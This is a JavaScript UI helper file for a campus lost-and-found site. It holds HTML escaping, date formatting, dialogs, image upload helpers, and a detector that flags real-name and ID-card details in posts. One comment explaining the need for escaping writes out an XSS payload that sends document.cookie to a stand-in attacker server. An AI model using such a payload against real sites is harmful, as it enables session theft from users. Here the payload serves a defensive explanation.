/* ==========================================================================
   ui.js —— 界面小工具
   --------------------------------------------------------------------------
   这里放的都是"和业务无关、但每个页面都要用"的东西：
   转义、时间格式化、提示条、确认弹窗、防抖等。
   ========================================================================== */

const UI = (() => {
  /* ======================================================================
     一、HTML 转义（安全关键）
     ======================================================================
     为什么必须有这个函数？
     ----------------------
     用户发布的标题和描述是**不可信内容**。如果直接拼进 innerHTML，
     别人就可以发一条标题是下面这样的信息：

         <img src=x onerror="fetch('http://坏人的服务器/?t='+document.cookie)">

     浏览器会把它当成真正的 HTML 执行，脚本就跑起来了 —— 这叫 XSS 攻击。

     【重要】后端已经把登录凭证放在 HttpOnly Cookie 里，JavaScript 读不到，
     所以就算被 XSS 也偷不走登录状态。这是"纵深防御"的第一层。
     但攻击者仍然能用脚本冒充用户发帖、删帖，所以**前端也必须转义**。
     两层防护缺一不可。

     所有往页面里插用户内容的地方，都要经过这个函数。
     ====================================================================== */
  function escapeHtml(value) {
    if (value === null || value === undefined) return '';
    return String(value)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  }

  /** 用于 HTML 属性里的转义（和上面一样，单独命名让调用处意图更清楚） */
  const escapeAttr = escapeHtml;

  /* ======================================================================
     二、时间处理
     ====================================================================== */

  /**
   * 把后端返回的时间字符串格式化成"人话"。
   *
   * 【注意两种时间语义不同】
   *  · created_at / updated_at：系统生成，后端返回带 Z 的 UTC 时间，
   *    例如 "2026-09-30T13:20:36Z"。new Date() 会自动换算成本地时区。
   *  · event_time：用户手填的丢失/拾取时间，没有时区标记，
   *    表示"用户的墙上时钟时间"，按本地时间原样显示即可，不能做时区换算。
   */
  function formatDateTime(value, { withTime = true } = {}) {
    if (!value) return '—';
    const date = new Date(value);
    if (Number.isNaN(date.getTime())) return String(value);

    const y = date.getFullYear();
    const m = String(date.getMonth() + 1).padStart(2, '0');
    const d = String(date.getDate()).padStart(2, '0');
    if (!withTime) return `${y}-${m}-${d}`;

    const hh = String(date.getHours()).padStart(2, '0');
    const mm = String(date.getMinutes()).padStart(2, '0');
    return `${y}-${m}-${d} ${hh}:${mm}`;
  }

  /** 相对时间：刚刚 / 5 分钟前 / 3 小时前 / 2 天前 / 具体日期 */
  function formatRelative(value) {
    if (!value) return '—';
    const date = new Date(value);
    if (Number.isNaN(date.getTime())) return String(value);

    const diffSec = Math.floor((Date.now() - date.getTime()) / 1000);
    if (diffSec < 0) return formatDateTime(value); // 未来时间直接显示具体值
    if (diffSec < 60) return '刚刚';
    if (diffSec < 3600) return `${Math.floor(diffSec / 60)} 分钟前`;
    if (diffSec < 86400) return `${Math.floor(diffSec / 3600)} 小时前`;
    if (diffSec < 86400 * 7) return `${Math.floor(diffSec / 86400)} 天前`;
    return formatDateTime(value, { withTime: false });
  }

  /** 把 DateTime-Local 输入框的值（如 2026-09-30T15:00）补成后端要的格式 */
  function normalizeDateTimeLocal(value) {
    if (!value) return null;
    // 输入框给的是 "2026-09-30T15:00"，补上秒，保持和后端格式一致
    return value.length === 16 ? `${value}:00` : value;
  }

  /* ======================================================================
     三、提示条（Toast）
     ====================================================================== */

  const ICONS = {
    success: '✅',
    error: '⚠️',
    warning: '⚠️',
    info: 'ℹ️',
  };

  function toast(message, type = 'info', detail = '') {
    const stack = document.getElementById('toastStack');
    if (!stack) return;

    const el = document.createElement('div');
    el.className = `toast is-${type}`;
    el.innerHTML = `
      <span class="toast-icon">${ICONS[type] || ICONS.info}</span>
      <div class="toast-body">
        <div class="toast-title">${escapeHtml(message)}</div>
        ${detail ? `<div class="toast-text">${escapeHtml(detail)}</div>` : ''}
      </div>
    `;
    stack.appendChild(el);

    // 3.2 秒后淡出移除。用 CSS 动画做过渡，比直接 remove 观感好。
    setTimeout(() => {
      el.style.transition = 'opacity 200ms ease, transform 200ms ease';
      el.style.opacity = '0';
      el.style.transform = 'translateX(20px)';
      setTimeout(() => el.remove(), 220);
    }, 3200);
  }

  /* ======================================================================
     四、确认弹窗
     ====================================================================== */

  let modalResolve = null;

  /**
   * 显示一个确认弹窗，返回 Promise<boolean>。
   *
   * 为什么不用原生 confirm()？
   * 因为原生 confirm 会阻塞整个页面、样式无法定制，
   * 而且部分浏览器会把它当弹窗广告拦截，体验和一致性都差。
   */
  function confirmDialog({ title = '确认操作', text = '', confirmText = '确认', danger = true } = {}) {
    const backdrop = document.getElementById('modalBackdrop');
    const titleEl = document.getElementById('modalTitle');
    const textEl = document.getElementById('modalText');
    const confirmBtn = document.getElementById('modalConfirm');
    const cancelBtn = document.getElementById('modalCancel');

    titleEl.textContent = title;
    textEl.textContent = text;
    confirmBtn.textContent = confirmText;
    confirmBtn.className = danger ? 'btn btn-danger' : 'btn btn-primary';
    backdrop.hidden = false;
    confirmBtn.focus();

    return new Promise((resolve) => {
      modalResolve = resolve;

      // 清理上一次绑定的事件，避免重复触发
      const cleanup = () => {
        confirmBtn.removeEventListener('click', onConfirm);
        cancelBtn.removeEventListener('click', onCancel);
        backdrop.removeEventListener('click', onBackdrop);
        document.removeEventListener('keydown', onKey);
      };
      const onConfirm = () => {
        cleanup();
        close();
        resolve(true);
      };
      const onCancel = () => {
        cleanup();
        close();
        resolve(false);
      };
      const onBackdrop = (e) => {
        if (e.target === backdrop) onCancel();
      };
      const onKey = (e) => {
        if (e.key === 'Escape') onCancel();
      };

      confirmBtn.addEventListener('click', onConfirm);
      cancelBtn.addEventListener('click', onCancel);
      backdrop.addEventListener('click', onBackdrop);
      document.addEventListener('keydown', onKey);
    });
  }

  function close() {
    const backdrop = document.getElementById('modalBackdrop');
    if (backdrop) backdrop.hidden = true;
    modalResolve = null;
  }

  /* ======================================================================
     五、图片查看
     ====================================================================== */

  function openLightbox(src) {
    const box = document.createElement('div');
    box.className = 'lightbox';
    const img = document.createElement('img');
    // 用 DOM API 设置 src，天然不会被当成 HTML 解析，比 innerHTML 安全
    img.src = src;
    img.alt = '图片预览';
    box.appendChild(img);
    box.addEventListener('click', () => box.remove());
    document.addEventListener(
      'keydown',
      function onEsc(e) {
        if (e.key === 'Escape') {
          box.remove();
          document.removeEventListener('keydown', onEsc);
        }
      },
      { once: false }
    );
    document.body.appendChild(box);
  }

  /* ======================================================================
     六、图片读成 base64
     ====================================================================== */

  /**
   * 把用户选的文件读成 base64 字符串。
   *
   * 为什么用 base64 而不是 FormData？
   * 因为后端的图片接口收的是 JSON 里的 base64 字段
   * （这样后端就不需要 python-multipart 依赖，见后端说明）。
   */
  function fileToBase64(file) {
    return new Promise((resolve, reject) => {
      // 前端也做一次大小检查，避免白等上传完才被后端拒绝
      const maxBytes = 5 * 1024 * 1024;
      if (file.size > maxBytes) {
        reject(new Error(`图片不能超过 5MB（当前 ${(file.size / 1024 / 1024).toFixed(1)}MB）`));
        return;
      }
      const reader = new FileReader();
      reader.onload = () => resolve(reader.result); // 形如 data:image/png;base64,xxx
      reader.onerror = () => reject(new Error('读取图片失败，请重新选择'));
      reader.readAsDataURL(file);
    });
  }

  /* ======================================================================
     七、杂项
     ====================================================================== */

  /** 防抖：搜索框输入时不要每敲一个字就发一次请求 */
  function debounce(fn, delay = 350) {
    let timer = null;
    return function debounced(...args) {
      clearTimeout(timer);
      timer = setTimeout(() => fn.apply(this, args), delay);
    };
  }

  /** 状态 / 类型对应的样式类名 */
  function typeClass(type) {
    return type === 'lost' ? 'badge-lost' : 'badge-found';
  }

  function statusClass(status) {
    if (status === 'searching') return 'badge-searching';
    if (status === 'found') return 'badge-found-status';
    return 'badge-closed';
  }

  const TYPE_TEXT = { lost: '寻物启事', found: '招领启事' };
  const STATUS_TEXT = { searching: '寻找中', found: '已找到', closed: '已结束' };

  /** 类型图标，用于没有图片时的占位 */
  const TYPE_EMOJI = { lost: '🚨', found: '📍' };

  /** 生成一个类型徽标 */
  function typeBadge(type, label) {
    return `<span class="badge ${typeClass(type)}">${escapeHtml(label || TYPE_TEXT[type] || type)}</span>`;
  }

  /** 生成一个状态徽标 */
  function statusBadge(status, label) {
    return `<span class="badge ${statusClass(status)}">${escapeHtml(
      label || STATUS_TEXT[status] || status
    )}</span>`;
  }

  /** 从名字取头像文字（中文取最后一个字，英文取首字母） */
  function avatarText(name) {
    const text = String(name || '?').trim();
    if (!text) return '?';
    if (/[\u4e00-\u9fff]/.test(text)) return text.slice(-1);
    return text[0].toUpperCase();
  }

  /** 滚动到页面顶部（切换页面时用） */
  function scrollTop() {
    window.scrollTo({ top: 0, behavior: 'instant' in window ? 'instant' : 'auto' });
  }

  /* ======================================================================
     七、实名信息识别（发布前的智能提示）
     ======================================================================
     背景：有些失物上直接带着实名信息（姓名、班级、学号），
     有些物品本身就是身份证、学生卡、银行卡。这类东西**不该走
     "挂到网上等人来认领"的流程**，原因有两个：

       1. 【效率】有实名信息就意味着"能直接找到这个人"。
          把东西直接送到他手上（或交给辅导员转交），
          比挂在网上等他自己刷到要快得多。
       2. 【隐私】把姓名、学号公开写在帖子里，等于替失主泄露了个人信息；
          而且别人扫一眼就知道是谁丢的，反而方便了冒领。

     所以这里做的是**识别 + 提示**，而不是阻止发布 ——
     发布者可能有自己的理由（比如已经交给宿管了，但想留个记录备查）。

     返回提示对象，或 null 表示没识别到实名信息。
     ====================================================================== */

  // 证件类关键词：这些东西本身就是身份凭证。
  // 最稳妥的处理是交给发证机构 —— 因为机构本来就有核验身份的能力
  // （校园卡中心知道谁是持卡人），我们不需要另建一套认领机制。
  //
  // 【我漏过词，这里说明一下】第一版只有「学生证」，结果「学生卡」识别不出来。
  // 校园里这两种叫法都在用，类似的还有「饭卡」「水卡」「借书证」，
  // 都是同一类东西的不同叫法，必须一并收录。
  const DOCUMENT_KEYWORDS = [
    '身份证',
    '学生证',
    '学生卡',
    '校园卡',
    '一卡通',
    '饭卡',
    '水卡',
    '借书证',
    '银行卡',
    '社保卡',
    '医保卡',
    '护照',
    '驾驶证',
    '团员证',
    '毕业证',
    '学位证',
  ];

  // 班级类模式：计算机2101班 / 计科2101 / 2101班 / 软工二班
  const CLASS_PATTERNS = [
    /[\u4e00-\u9fff]{2,8}\d{2,4}班/, // 计算机2101班
    /[\u4e00-\u9fff]{2,8}\d{2,4}/, // 计科2101（省略"班"字）
    /\d{4}班/, // 2101班
    /[\u4e00-\u9fff]{2,4}[一二三四五六七八九]班/, // 软工二班
  ];

  // 学号类：8~14 位连续数字（学号通常在这个长度区间）。
  // 【注意】这条规则比较宽，手机号、快递单号也会命中。
  // 但因为这里只是"给提示"而不是"拦截"，误报的代价只是多一句提醒，
  // 所以宁可宽一点 —— 漏报（该提示却没提示）的代价更大。
  const STUDENT_ID_PATTERN = /(?<!\d)\d{8,14}(?!\d)/;

  // 姓名特征词：出现这些词说明文本里带了具体人名
  const NAME_HINT_PATTERN = /(姓名|名字|本人是|名叫)/;

  // 常见物品名词。用在"某人的某物"模式里。
  //
  // 【坑】必须把「学生卡」「饭卡」这类**复合词整体**列进来。
  // 我第一版只写了单字「卡」，结果「李四的饭卡」匹配不到 ——
  // 因为"的"后面紧跟的是"饭"而不是"卡"，正则从"的"之后开始匹配就失败了。
  // 同理「张三的学生卡」也漏了。所以复合词必须排在单字前面。
  const ITEM_WORDS =
    '学生卡|学生证|校园卡|借书证|银行卡|饭卡|水卡|一卡通|充电宝|耳机|手机|眼镜|电脑|平板|钱包|钥匙|本子|作业|文具|衣服|外套|雨衣|帽子|行李|箱子|书包|水杯|雨伞|卡|证|书|包|伞|杯';

  // 百家姓（覆盖绝大多数汉族姓氏）。
  //
  // 【为什么要用姓氏表，而不是简单匹配"2~4 个汉字 + 的 + 物品词"】
  // 因为后者会把形容词误判成人名。实测踩到的例子：
  //     「白色的手机」→ "白色的"被当成人名
  //     「黑色的雨伞」→ "黑色的"被当成人名
  // 这类误报会让提示变得很吵，用户干脆就不看了。
  const SURNAMES =
    '赵钱孙李周吴郑王冯陈褚卫蒋沈韩杨朱秦尤许何吕施张孔曹严华金魏陶姜' +
    '戚谢邹喻柏水窦章云苏潘葛奚范彭郎鲁韦昌马苗凤花方俞任袁柳鲍史唐' +
    '费廉岑薛雷贺倪汤滕殷罗毕郝邬安常乐于时傅皮卞齐康伍余元卜顾孟平' +
    '黄和穆萧尹姚邵湛汪祁毛禹狄米贝明臧计伏成戴宋茅庞熊纪舒屈项祝董' +
    '梁杜阮蓝闵席季麻强贾路娄危江童颜郭梅盛林刁钟徐邱骆高夏蔡田樊胡' +
    '凌霍虞万支柯昝管卢莫房裘缪干解应宗丁宣贲邓郁单杭洪包诸左石崔吉' +
    '钮龚程嵇邢滑裴陆荣翁荀羊甄封芮羿储靳汲邴糜松井段富巫乌焦巴弓牧' +
    '隗山谷车侯宓蓬全郗班仰秋仲伊宫宁仇栾暴甘钭厉戎祖武符刘景詹束龙' +
    '叶幸司韶郜黎蓟薄印宿白怀蒲台从鄂索咸籍赖卓蔺屠蒙池乔阴胥能苍双' +
    '闻莘党翟谭贡劳逄姬申扶堵冉宰郦雍却璩桑桂濮牛寿通边扈燕冀郏浦尚' +
    '农温别庄晏柴瞿阎充慕连茹习宦艾鱼容向古易慎戈廖庾终暨居衡步都耿' +
    '满弘匡国寇广禄阙东欧殳沃利蔚越夔隆师巩厍聂晁勾敖融冷訾辛阚那' +
    '简饶空曾毋沙乜养鞠须丰巢关蒯相查后荆红游竺权逯盖益桓公';

  // 形容词 / 量词结尾。紧跟"的"前面的如果是这些字，说明那是修饰语而不是人名。
  //
  // 【为什么必须加这个负向断言】
  // 因为"白""黑""蓝""黄"等字本身就是常见姓氏
  // （白起、白居易；黄庭坚……），所以「白色的手机」会被姓氏表
  // 匹配成"白" + "色的"。加上这个断言后，
  // 「白色的」「黑色的」「这个的」都会被正确排除。
  const ADJECTIVE_TAIL = '色样款种个只条张块把台部件副双';

  // 「某人的某物」：姓氏 + 1~2 字名 + 的 + 物品词
  // 例如「张三的卡」「李明的水杯」「李四的饭卡」
  const NAME_POSSESSIVE_PATTERN = new RegExp(
    `[${SURNAMES}][\\u4e00-\\u9fff]{1,2}(?<![${ADJECTIVE_TAIL}])的(?:${ITEM_WORDS})`
  );

  /**
   * 判断文本里是否含实名信息。
   * @param {string} text 通常是"物品名称 + 详细描述"拼起来的文本
   * @returns {object|null} 提示对象
   */
  function detectIdentityInfo(text) {
    const raw = String(text || '');
    if (!raw.trim()) return null;

    const matchedDocs = DOCUMENT_KEYWORDS.filter((kw) => raw.includes(kw));
    const hasDocument = matchedDocs.length > 0;

    // 姓名识别用了三种模式，按可靠性从高到低：
    //   1. 特征词      「姓名：李四」「本人是张三」       最可靠
    //   2. XX同学/老师  「这是王同学的水杯」              可靠
    //   3. 「XX的某物」 「张三的学生卡」                  较可靠，靠物品词兜底
    //
    // 第 3 种是后加的：我原来只认前两种，结果「张三的学生卡」
    // 识别不出姓名，只报了个"班级"。加上"XX的+物品名"这种形式后覆盖面明显变好。
    // 限制条件是必须紧跟物品名词，否则「黑色的雨伞」会被误判成人名。
    const hasName =
      NAME_HINT_PATTERN.test(raw) ||
      /[\u4e00-\u9fff]{2,4}(同学|老师)/.test(raw) ||
      NAME_POSSESSIVE_PATTERN.test(raw);

    const hasClass = CLASS_PATTERNS.some((p) => p.test(raw));
    const hasStudentId = STUDENT_ID_PATTERN.test(raw);

    // ---------- 情况 1：证件本身（优先级最高）----------
    // 这类物品的处理方式和普通物品完全不同，所以单独给一套指引。
    //
    // 注意：这里把姓名/班级/学号也一起列进 matched。
    // 虽然证件场景下"交给机构"才是主线，但把识别到的身份信息列出来，
    // 能让用户确认"系统确实看出这是谁的东西了"，而不是疑惑为什么被拦。
    if (hasDocument) {
      const found = [...matchedDocs];
      if (hasName) found.push('姓名');
      if (hasClass) found.push('班级');
      if (hasStudentId) found.push('学号');

      return {
        level: 'document',
        kind: '证件类物品',
        matched: found,
        title: '这类东西建议直接交给发证机构，不用挂在网上',
        reason:
          '身份证、学生证、校园卡、银行卡本身就是「凭证」。机构本来就能核验身份，' +
          '交给他们比挂网等人认领更快、更安全；而把姓名学号写在帖子里，' +
          '等于替失主泄露了个人信息。',
        routes: [
          { label: '校园卡 / 学生证 / 学生卡', target: '交到校园卡服务中心或教务处' },
          { label: '身份证 / 银行卡', target: '交到学校保卫处，或对应银行的网点' },
          { label: '已经交给别人了', target: '在下面「保管者」里填清楚交给了谁' },
        ],
      };
    }

    // ---------- 情况 2：有姓名或班级 ----------
    if (hasName || hasClass) {
      const found = [];
      if (hasName) found.push('姓名');
      if (hasClass) found.push('班级');
      if (hasStudentId) found.push('学号');

      return {
        level: 'contact',
        kind: '实名信息',
        matched: found,
        title: `物品上带了${found.join('、')}，也许不用走认领流程`,
        reason:
          '有实名信息就意味着「能直接找到这个人」。把东西直接送到他手上，' +
          '比挂在网上等他自己刷到要快得多。',
        routes: [
          { label: '如果你认识这个人', target: '直接联系 TA，或托认识的同学转交' },
          { label: '如果不认识，只有名字或班级', target: '找辅导员 / 班主任帮忙查' },
          { label: '如果是在宿舍楼附近捡的', target: '交给宿管阿姨，她通常认得本楼的人' },
          { label: '如果你还是想发帖', target: '可以发布，但建议不要写出完整姓名和学号' },
        ],
      };
    }

    // ---------- 情况 3：只有一长串数字（疑似学号）----------
    if (hasStudentId) {
      return {
        level: 'contact',
        kind: '疑似学号',
        matched: ['一长串数字'],
        title: '帖子里有一长串数字，可能是学号',
        reason:
          '如果那是学号，凭学号通常可以请辅导员或教务处帮忙查到人。' +
          '但学号属于个人信息，不建议直接公开写在帖子里。',
        routes: [
          { label: '想自己找', target: '把号码交给辅导员，请 TA 帮忙联系本人' },
          { label: '想发帖', target: '可以发布，但建议把中间几位打码（如 2021****12）' },
        ],
      };
    }

    return null;
  }

  /** 把提示对象渲染成 HTML。两种级别用不同的视觉语气。 */
  function renderIdentityTip(info) {
    if (!info) return '';

    const isDocument = info.level === 'document';
    const tone = isDocument ? 'danger' : 'warning';
    const icon = isDocument ? '🪪' : '💡';

    return `
      <div class="idtip idtip-${tone}">
        <div class="idtip-head">
          <span class="idtip-icon">${icon}</span>
          <strong>${escapeHtml(info.title)}</strong>
        </div>
        <p class="idtip-reason">${escapeHtml(info.reason)}</p>
        <ul class="idtip-routes">
          ${info.routes
            .map(
              (r) => `<li>
                <span class="idtip-route-label">${escapeHtml(r.label)}</span>
                <span class="idtip-route-arrow">→</span>
                <span class="idtip-route-target">${escapeHtml(r.target)}</span>
              </li>`
            )
            .join('')}
        </ul>
      </div>
    `;
  }

  return {
    escapeHtml,
    escapeAttr,
    formatDateTime,
    formatRelative,
    normalizeDateTimeLocal,
    toast,
    confirmDialog,
    openLightbox,
    fileToBase64,
    debounce,
    typeClass,
    statusClass,
    typeBadge,
    statusBadge,
    avatarText,
    scrollTop,
    detectIdentityInfo,
    renderIdentityTip,
    TYPE_TEXT,
    STATUS_TEXT,
    TYPE_EMOJI,
  };
})();
